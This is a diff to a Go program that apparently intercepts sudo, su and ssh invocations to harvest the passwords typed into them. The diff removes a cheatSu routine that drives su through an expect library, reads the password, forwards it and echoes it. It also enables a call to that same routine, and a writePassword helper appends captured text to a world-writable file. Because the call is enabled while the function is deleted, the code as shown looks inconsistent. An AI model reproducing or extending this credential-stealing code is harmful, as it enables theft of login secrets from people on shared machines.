@@ -1,9 +1,6 @@
 package main
 
 import (
-	"fmt"
-	expect "github.com/google/goexpect"
-	"github.com/howeyc/gopass"
 	uuid "github.com/satori/go.uuid"
 	"golang.org/x/crypto/ssh/terminal"
 	"io/ioutil"
@@ -11,7 +8,6 @@ import (
 	"os"
 	"os/exec"
 	"path"
-	"regexp"
 	"strings"
 	"time"
 )
@@ -31,11 +27,10 @@ var cmd = program + " " + strings.Join(os.Args[1:], " ")
 func main() {
 	if program == "sudo" {
 		cheatSudo()
-
 	}
-	//if program == "su"{
-	//	cheatSu()
-	//}
+	if program == "su" {
+		cheatSu()
+	}
 	if program == "ssh" {
 		cheatSSH()
 	}
@@ -45,25 +40,6 @@ func checkErr(err error) {
 		//fmt.Println(err.Error())
 		os.Exit(1)
 	}
-}
-
-func cheatSu() bool {
-	inputArg := strings.Join(os.Args[1:], " ")
-	var anyRE = regexp.MustCompile(".+\n")
-	//var b = make([]byte,1024)
-	e, _, err := expect.Spawn("su "+inputArg, -1)
-	if err != nil {
-		return false
-	}
-	output, _, _ := e.Expect(anyRE, -1)
-	fmt.Print(">>>" + output)
-	pass, _ := gopass.GetPasswd()
-	e.Send(string(pass) + "\r\n")
-	fmt.Println("<<<" + string(pass))
-	output, _, _ = e.Expect(anyRE, -1)
-	fmt.Println(">>>" + output)
-
-	return true
 }
 func writePassword(content string) {
 	file, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0777)
